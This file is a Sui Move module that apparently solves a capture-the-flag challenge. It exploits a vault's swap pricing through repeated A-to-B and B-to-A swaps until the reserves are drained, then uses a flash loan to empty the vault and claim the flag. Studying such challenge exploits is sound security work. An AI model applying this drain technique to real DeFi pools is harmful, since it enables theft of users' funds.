module solve_task8::solve {
    use sui::coin::{Coin, join, split};
    use task8::vault::{Vault, flash, repay_flash, swap_a_to_b, swap_b_to_a, get_flag};

    public fun swap_rounds<A,B>(vault: &mut Vault<A,B>, our_10a: Coin<A>, our_10b: Coin<B>, ctx: &mut TxContext) {
        // Use user coin of 10 A and 10 B for initial swapping
        let coin_b = swap_a_to_b(vault, our_10a, ctx); // our_10b=10, coin_b=10, vault:110/90
        let coin_a = swap_b_to_a(vault, our_10b, ctx); // coin_a=12, coin_b=10, vault:98/100
        // keep swapping until A or B balance reaches 0 in vault
        let mut coin_b2 = swap_a_to_b(vault, coin_a, ctx); // coin_b2=12, vault:110/88
        coin_b2.join(coin_b); // coin_b=22, vault:110/88
        let coin_a2 = swap_b_to_a(vault, coin_b2, ctx); // coin_a2=27, vault:83/110
        let coin_b3 = swap_a_to_b(vault, coin_a2, ctx); // coin_b3=35, vault:110/75
        let coin_a3 = swap_b_to_a(vault, coin_b3, ctx); // coin_a3=51, vault:59/110
        let mut coin_b4 = swap_a_to_b(vault, coin_a3, ctx); // coin_b4=95, vault:110/15
        let coin_b40 = coin_b4.split(15, ctx);
        let coin_a4 = swap_b_to_a(vault, coin_b40, ctx); // coin_a4=110, vault:0/30
        let (coin_a5, coin_b5, receipt) = flash(vault, 30, true, ctx); // vault:0/0
        get_flag(vault, ctx);
        repay_flash(vault, coin_a5, coin_b5, receipt);
        transfer::public_transfer(coin_a4, @0x0);
        transfer::public_transfer(coin_b4, @0x0);
    }
}